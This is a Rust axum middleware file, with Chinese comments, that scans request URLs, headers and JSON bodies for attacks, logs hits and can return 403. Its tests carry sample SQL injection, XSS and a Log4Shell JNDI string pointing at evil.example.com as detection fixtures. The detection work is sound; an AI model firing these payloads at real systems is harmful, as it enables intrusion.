// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz
//! 请求安全扫描中间件（阶段 5a，security-rust 3.0.0 的 32 个检测器）。
//!
//! 契约见 `docs/superpowers/plans/2026-10-06-bra-v1.5-c-modules.md`
//! 「阶段 5a 契约 · 请求安全扫描」。要点：
//! - **默认只报告不拦截**（`[security] scan = off`）：命中写一行 `tracing::warn!` +
//!   一条 `audit_log`，请求照常往下走。`high` / `critical` 才按 `assess()` 的聚合等级 403。
//! - 扫三处：URL（`path?query`，**原文与解码后各扫一遍** —— 真实 payload 都是百分号
//!   编码的，只扫原文等于漏掉绝大多数攻击）、指定头、`application/json` 且 ≤ 64KB 的体。
//!   **multipart 一律不碰** —— 读它会把整个上传缓冲进内存，正好毁掉分片上传的意义。
//! - 命中**不把原始 payload 写进 audit_log**（长期保留的库不该存攻击串），只记等级与检测器名。
//!
//! 挂在最外层（在审计层之外，见 `main.rs` 的 layer 顺序）：未通过鉴权的请求也要被扫到，
//! 命中在业务逻辑之前留痕。扫描是纯同步无 IO 的（32 组正则），直接在这跑，不必 spawn_blocking。

use crate::audit;
use crate::error::{ApiError, SECURITY_BLOCKED};
use crate::models::AuditLog;
use crate::state::AppState;
use crate::util::now;
use axum::body::{Body, to_bytes};
use axum::extract::{Request, State};
use axum::http::{HeaderMap, header};
use axum::middleware::Next;
use axum::response::{IntoResponse, Response};
use bee_orm::Model;
use security_rust::{DetectionResult, RiskLevel, Scanner, Severity};

/// 请求体扫描上限（字节）：>64KB 的体不读。JSON 体不会这么大，大的多半是上传。
const BODY_LIMIT: usize = 64 * 1024;

/// 扫的请求头：Host 头与 Log4Shell 的载体、UA/Referer/Origin 是 XSS 与开放重定向的常客。
const SCAN_HEADERS: [&str; 5] = ["host", "user-agent", "referer", "origin", "x-forwarded-host"];

/// 一个扫描目标：串 + 它是不是「host 类」头（过滤规则见 [`is_self_address_noise`]）。
struct Target {
    text: String,
    host_like: bool,
}

impl Target {
    fn url(text: impl Into<String>) -> Self {
        Self { text: text.into(), host_like: false }
    }

    /// 从头的名字与（已按 [`header_target`] 裁剪的）值建目标。
    fn header(name: &str, value: &str) -> Self {
        Self {
            text: value.to_string(),
            host_like: name == "host" || name == "x-forwarded-host",
        }
    }
}

/// 头的扫描值。`referer` / `origin` 是浏览器自动填的**完整 URL**，它们的 authority 就是
/// 本系统自己 —— 内网/环回部署下形如 `//127.0.0.1`，而插件的 SSRF 检测器见 `//127.`
/// 直接判 **CRITICAL**（实测）：照原样扫，`scan = high/critical` 会把每一个带 Referer /
/// Origin 的正常请求都 403 掉（本机测试与内网部署必中，整个后台都用不了）。
/// 载荷（Log4Shell / XSS / 穿越）在路径与查询里，所以这两类头**只扫 authority 之后的部分**。
fn header_target<'a>(name: &str, value: &'a str) -> &'a str {
    if name == "referer" || name == "origin" { url_payload(value) } else { value }
}

/// 去掉 `scheme://authority`，留下路径与查询（没有 authority 就原样返回）。
fn url_payload(value: &str) -> &str {
    let Some(i) = value.find("://") else { return value };
    match value[i + 3..].find('/') {
        Some(j) => &value[i + 3 + j..],
        // 只有 authority（Origin 就是这种形态）：没有路径可扫
        None => "/",
    }
}

/// 表单语义解码后的扫描目标（`%XX` 解字节，`+` 当空格）；原文里没有 `%`/`+` 时返回 `None`
/// （解码结果就是原文，不必重复扫）。
///
/// 真实攻击与浏览器发出的请求，payload 都是百分号编码的：`1' OR '1'='1-- ` 编成
/// `1%27%20OR%20%271%27%3D%271--%20` 后只扫原文 **0 命中**（E2E 实测），解码才认得出。
/// 原文照扫（有检测器就是认 `%2F` 这类编码字面量），解码是**增量**：多扫一遍，只多命中。
fn decode_url(raw: &str) -> Option<String> {
    if !raw.contains(['%', '+']) {
        return None;
    }
    Some(
        form_urlencoded::parse(raw.as_bytes())
            .map(|(k, v)| format!("{k}={v}"))
            .collect::<Vec<_>>()
            .join("&"),
    )
}

/// 中间件入口。`[security] scan = off`（默认）时只留痕；达到阈值时 403 + `err = "security.blocked"`。
pub async fn scan_mw(State(state): State<AppState>, req: Request, next: Next) -> Response {
    let (parts, body) = req.into_parts();

    let url = match parts.uri.query() {
        Some(q) => format!("{}?{}", parts.uri.path(), q),
        None => parts.uri.path().to_string(),
    };
    // 原文 + 解码后（后者见 [`decode_url`]）：编码掉的引号/尖括号只有解码后才认得出来
    let mut targets = vec![Target::url(url.clone())];
    if let Some(decoded) = decode_url(&url) {
        targets.push(Target::url(decoded));
    }
    for name in SCAN_HEADERS {
        if let Some(v) = parts.headers.get(name).and_then(|v| v.to_str().ok()) {
            let value = header_target(name, v);
            targets.push(Target::header(name, value));
            // referer / origin 也是 URL：查询串里的编码载荷与请求 URI 同理，解码后再扫一遍
            if (name == "referer" || name == "origin")
                && let Some(decoded) = decode_url(value)
            {
                targets.push(Target::header(name, &decoded));
            }
        }
    }

    // 只碰「确定能整个读出来」的 JSON 体，读完**原样放回**（业务提取器照常解析）。
    // 其余（multipart / 其他类型 / 无 Content-Length 的 chunked）连读都不读。
    let body = if is_scannable(&parts.headers) {
        match to_bytes(body, BODY_LIMIT).await {
            Ok(bytes) => {
                targets.push(Target::url(String::from_utf8_lossy(&bytes).into_owned()));
                Body::from(bytes)
            }
            // 声明了 Content-Length 却读不到（客户端中断）：原体已无法还原，
            // 交空体给业务（它会回 400「请求体格式错误」），不在这里假装成功
            Err(e) => {
                tracing::warn!("安全扫描读取请求体失败: {e}");
                Body::empty()
            }
        }
    } else {
        body
    };
    let req = Request::from_parts(parts, body);

    let Some(hit) = scan_targets(&state.scanner, &targets) else {
        return next.run(req).await;
    };

    let blocked = state.cfg.security_scan.is_some_and(|threshold| hit.level >= threshold);
    let (method, path) = (req.method().clone(), req.uri().path().to_string());
    tracing::warn!(
        "安全扫描命中 等级 {} 检测器 {} {} {}",
        hit.level,
        hit.detectors.join(","),
        method,
        path
    );

    // 先留痕再放行/拦截：审计失败不影响业务（与 audit_mw 同一个态度）。
    // 拦截时请求不会走到 audit_mw，这条就是唯一的记录，所以带操作者。
    let (admin_id, username) = audit::actor(&state, req.headers()).await;
    match state.next_id() {
        Ok(id) => {
            let row = AuditLog {
                id,
                admin_id,
                username,
                module: "security".into(),
                action: "安全扫描命中".into(),
                method: method.to_string(),
                path: path.chars().take(255).collect(),
                status: if blocked { 0 } else { 1 },
                // 只记等级与检测器名：审计日志长期保留，原始 payload 不进库
                msg: hit.detail().chars().take(255).collect(),
                duration_ms: 0,
                ip: crate::api::auth::client_ip(req.headers()),
                created_at: now(),
            };
            if let Err(e) = row.insert(&state.db).await {
                tracing::error!("写安全扫描日志失败: {e}");
            }
        }
        Err(e) => tracing::error!("生成安全扫描日志 id 失败: {e:?}"),
    }

    if blocked {
        return ApiError::Forbidden(SECURITY_BLOCKED.into()).into_response();
    }
    next.run(req).await
}

/// 一次扫描的命中汇总：最高等级 + 命中的检测器名（去重、保序）。
struct Hit {
    level: RiskLevel,
    detectors: Vec<String>,
}

impl Hit {
    fn detail(&self) -> String {
        format!("等级 {} 检测器 {}", self.level, self.detectors.join(","))
    }
}

/// 逐目标扫，等级取**各位置的最大值**：每个位置单独 `assess()`，
/// 跨位置的弱信号不叠加（叠加会把一条条都不过线的正常请求也推过阈值）。
fn scan_targets(scanner: &Scanner, targets: &[Target]) -> Option<Hit> {
    let mut hit: Option<Hit> = None;
    for target in targets {
        let results: Vec<DetectionResult> = scanner
            .scan(&target.text)
            .into_iter()
            .filter(|r| !is_self_address_noise(target, r))
            .collect();
        if results.is_empty() {
            continue;
        }
        let level = security_rust::assess(&results).level;
        let hit = hit.get_or_insert(Hit { level, detectors: Vec::new() });
        hit.level = hit.level.max(level);
        for r in results {
            if !hit.detectors.contains(&r.attack_type) {
                hit.detectors.push(r.attack_type);
            }
        }
    }
    hit
}

/// Host / X-Forwarded-Host 里的**裸内网字面量**（弱档 SSRF，Low）就是本部署自己的地址 ——
/// 插件自己把它列为「正常侧」（`Host: 10.244.1.5`、`X-Forwarded-For: 10.0.0.5`），
/// 但按 IP 访问的部署（内网 IP / 127.0.0.1 测试）会因此**每个请求**都留一条
/// `等级 LOW 检测器 ssrf` 的审计记录，把真正的命中淹掉。
/// 只滤这一种形态：URL 位置（`//127.` 强档）、其它检测器、其它位置都不受影响。
fn is_self_address_noise(target: &Target, r: &DetectionResult) -> bool {
    target.host_like && r.attack_type == "ssrf" && r.severity == Severity::Low
}

/// 只扫「确定小」的 JSON 体。没有 Content-Length（chunked 上传）时**不读**：
/// 读到一半失败没法把 body 放回去，宁可漏扫也不冒破坏请求的风险。
fn is_scannable(headers: &HeaderMap) -> bool {
    let is_json = headers
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| {
            v.split(';').next().unwrap_or("").trim().eq_ignore_ascii_case("application/json")
        });
    is_json
        && headers
            .get(header::CONTENT_LENGTH)
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.parse::<u64>().ok())
            .is_some_and(|len| len <= BODY_LIMIT as u64)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn headers(pairs: &[(&str, &str)]) -> HeaderMap {
        let mut h = HeaderMap::new();
        for (k, v) in pairs {
            h.insert(
                header::HeaderName::from_bytes(k.as_bytes()).unwrap(),
                v.parse().unwrap(),
            );
        }
        h
    }

    /// 只有「JSON + 带着不超限的 Content-Length」才读体：
    /// multipart（头像分片上传）与其他类型一律不碰。
    #[test]
    fn only_small_json_bodies_are_scannable() {
        assert!(is_scannable(&headers(&[
            ("content-type", "application/json"),
            ("content-length", "123"),
        ])));
        assert!(is_scannable(&headers(&[
            ("content-type", "application/json; charset=utf-8"),
            ("content-length", "65536"),
        ])), "上限本身要认");
        assert!(
            !is_scannable(&headers(&[
                ("content-type", "application/json"),
                ("content-length", "65537"),
            ])),
            "超限不读"
        );
        assert!(
            !is_scannable(&headers(&[
                ("content-type", "multipart/form-data; boundary=x"),
                ("content-length", "512"),
            ])),
            "multipart 一律不读"
        );
        assert!(
            !is_scannable(&headers(&[
                ("content-type", "application/json"),
                // 无 Content-Length（chunked）：读失败没法还原 body，宁可不扫
            ])),
            "没有 Content-Length 不读"
        );
        assert!(
            !is_scannable(&headers(&[("content-length", "10")])),
            "没有 content-type 不读"
        );
        assert!(
            !is_scannable(&headers(&[
                ("content-type", "text/plain"),
                ("content-length", "10"),
            ])),
            "非 JSON 不读"
        );
    }

    /// 误报护栏（配合 `[security] scan = high`）：正常请求的每一处输入都不能过线。
    /// 拦截模式下这些都会被 403，所以这里是「不能拦」的底线。
    /// 走的是中间件**实际会扫的那份串**（头经 [`header_target`]），不是原始头值。
    #[test]
    fn normal_requests_stay_below_high() {
        let scanner = Scanner::default();
        let mut targets: Vec<String> = [
            // URL（带正常查询串）
            "/api/v1/admins?page=1&size=10&username=zhangsan",
            "/api/v1/dicts?page=1&size=10",
            "/api/v1/audit-logs?start=2026-10-09%2000:00:00&end=2026-10-09%2023:59:59",
            "/api/v1/health",
            // JSON 体（登录 / 中文公告 / 字典项 / 带 % 与 = 的备注）
            r#"{"username":"admin","password":"admin123"}"#,
            r#"{"title":"系统维护通知","content":"今晚 22:00-23:00 例行维护，期间可能短暂不可用。","type":1}"#,
            r#"{"label":"订单状态","value":"paid","sort":10}"#,
            r#"{"remark":"折扣 50% off，第二件半价（限时 = 3 天）","name":"张三"}"#,
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        for (name, value) in [
            ("host", "127.0.0.1:8080"),
            ("x-forwarded-host", "admin.internal.example.com"),
            ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            ("user-agent", "reqwest/0.12.5"),
            // 本机 / 内网 / 域名三种正常 Referer（浏览器自动填的就是本系统自己）
            ("referer", "http://127.0.0.1:8080/system/admin"),
            ("referer", "http://192.168.1.10:8080/system/role"),
            ("referer", "https://admin.example.com/system/dict"),
            ("origin", "http://127.0.0.1:8080"),
        ] {
            targets.push(header_target(name, value).to_string());
        }
        for target in targets {
            let level = security_rust::assess(&scanner.scan(&target)).level;
            assert!(level < RiskLevel::High, "正常输入被判 {level}: {target:?}");
        }
    }

    /// Referer / Origin 只扫 authority 之后的部分：否则内网/环回部署下，本系统自己的
    /// Referer（`http://127.0.0.1:8080/system/admin`）会被 SSRF 检测器判 CRITICAL，
    /// 拦截模式下每个正常请求都 403（插件实测行为，别改回去）。
    #[test]
    fn url_headers_drop_the_authority_but_keep_the_payload() {
        assert_eq!(url_payload("http://127.0.0.1:8080/system/admin"), "/system/admin");
        assert_eq!(url_payload("https://admin.example.com"), "/", "Origin 只有 authority");
        assert_eq!(url_payload("host:port"), "host:port", "不是完整 URL：原样扫");

        let scanner = Scanner::default();
        let hit = scan_targets(
            &scanner,
            &[Target::url(header_target(
                "referer",
                "http://evil.example.com/?q=<img src=x onerror=alert(1)>",
            ))],
        )
        .expect("Referer 查询串里的 XSS 不能漏");
        assert!(hit.level >= RiskLevel::High, "等级 {} 拦不住", hit.level);
    }

    /// Host / X-Forwarded-Host 里的裸内网字面量是本部署自己的地址，不算命中 ——
    /// 否则按 IP 访问的部署（内网 IP / 本机测试）**每个请求**都会写一条
    /// `等级 LOW 检测器 ssrf` 的审计记录。其它检测器与其它位置不受影响。
    #[test]
    fn host_self_address_is_not_a_hit() {
        let scanner = Scanner::default();
        for host in ["127.0.0.1:8080", "192.168.1.10:8080", "10.244.1.5", "admin.internal:8080"] {
            assert!(
                scan_targets(&scanner, &[Target::header("host", host)]).is_none(),
                "本部署自己的地址不该算命中: {host}"
            );
        }
        assert!(
            scan_targets(&scanner, &[Target::header("x-forwarded-host", "10.244.1.5")]).is_none(),
            "X-Forwarded-Host 同理（k8s 按 Pod IP 互调是日常）"
        );
        // 同一个字面量出现在**内容**里（查询串 / 体）照旧留痕：弱档也是信号
        assert!(scan_targets(&scanner, &[Target::url("10.0.0.1")]).is_some());
        // Host 里的强档载荷（Log4Shell / 头注入）不能被这条过滤带走
        assert!(
            scan_targets(&scanner, &[Target::header("host", "${jndi:ldap://evil.example.com/a}")])
                .is_some(),
            "Host 头是 Log4Shell 的载体，必须仍然命中"
        );
    }

    /// 攻击串必须命中、且到得了 `high` 档（`scan = high/critical` 才有得拦）。
    #[test]
    fn attack_payloads_reach_high() {
        let scanner = Scanner::default();
        // 空格型载荷（`%20` 在检测器的模式里就是可选空格），接口上最直白的形态；
        // 引号被编码掉的形态由 [`percent_encoded_payloads_are_decoded_and_hit`] 覆盖
        let hit = scan_targets(
            &scanner,
            &[Target::url("/api/v1/health?q=1%20UNION%20SELECT%20password%20FROM%20admin")],
        )
        .expect("编码后的查询串 SQLi 必须命中");
        assert!(hit.level >= RiskLevel::High, "等级 {} 拦不住", hit.level);
        assert!(
            hit.detectors.contains(&"sql_injection".to_string()),
            "detail 里要能看出命中了哪些检测器: {:?}",
            hit.detectors
        );
        assert!(hit.detail().contains("sql_injection"));

        let hit = scan_targets(&scanner, &[Target::url(r#"{"name":"<img src=x onerror=alert(1)>"}"#)])
            .expect("JSON 体里的 XSS 必须命中");
        assert!(hit.level >= RiskLevel::High);
    }

    /// 百分号编码的 payload：原文扫不到（引号变 `%27` 就认不出了，实测 0 命中），
    /// 解码后再扫必须命中 —— 真实请求里 payload 从来是编码的，这是检出率的命门。
    #[test]
    fn percent_encoded_payloads_are_decoded_and_hit() {
        let scanner = Scanner::default();

        // 解码语义：`%XX` 按字节解，`+` 按表单语义 = 空格
        assert_eq!(
            decode_url("/api/v1/health?q=1%27%20OR%20%271%27%3D%271--%20").unwrap(),
            "/api/v1/health?q=1' OR '1'='1-- "
        );
        assert_eq!(decode_url("?q=1+OR+1=1").unwrap(), "?q=1 OR 1=1");
        // 没有 % / + 就不解码：原文即结果，不重复扫
        assert_eq!(decode_url("/api/v1/health?q=1"), None);

        // 编码后的 `1' OR '1'='1-- `：解码态要到 High 档（high 阈值下拦得住）
        let raw = "/api/v1/health?q=1%27%20OR%20%271%27%3D%271--%20";
        let decoded = decode_url(raw).expect("含 % 应解码");
        let hit = scan_targets(&scanner, &[Target::url(raw.to_string()), Target::url(decoded)])
            .expect("解码后必须命中");
        assert!(hit.level >= RiskLevel::High, "等级 {} 拦不住", hit.level);

        // 编码的 XSS：解码后要有命中（等级是 Low —— 插件的评分，high 档拦不住，见发版说明）
        let xss = decode_url("/api/v1/health?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E").unwrap();
        assert_eq!(xss, "/api/v1/health?q=<script>alert(1)</script>");
        assert!(scan_targets(&scanner, &[Target::url(xss)]).is_some(), "解码后的 XSS 要有命中");

        // 误报护栏：正常的中文百分号编码查询串，解码前后都不能过线
        let raw = "/api/v1/admins?name=%E5%BC%A0%E4%B8%89&page=1&size=10";
        let decoded = decode_url(raw).unwrap();
        assert_eq!(decoded, "/api/v1/admins?name=张三&page=1&size=10");
        for target in [raw, decoded.as_str()] {
            if let Some(hit) = scan_targets(&scanner, &[Target::url(target)]) {
                assert!(hit.level < RiskLevel::High, "正常中文查询串被判 {}: {target}", hit.level);
            }
        }
    }

    /// 多目标取最高等级、检测器去重（同一检测器命中多次只记一次）。
    #[test]
    fn scan_targets_takes_max_level_and_dedups() {
        let scanner = Scanner::default();
        let hit = scan_targets(
            &scanner,
            &[
                Target::url("/api/v1/health"),
                Target::url("1' OR '1'='1"),
                Target::url("UNION SELECT password FROM admin"),
            ],
        )
        .unwrap();
        assert!(
            hit.detectors.contains(&"sql_injection".to_string()),
            "{:?}",
            hit.detectors
        );
        let mut deduped = hit.detectors.clone();
        deduped.sort_unstable();
        deduped.dedup();
        assert_eq!(deduped.len(), hit.detectors.len(), "检测器名要去重: {:?}", hit.detectors);
        assert!(hit.level >= RiskLevel::High);
        assert!(scan_targets(&scanner, &[Target::url("/api/v1/health")]).is_none());
    }
}
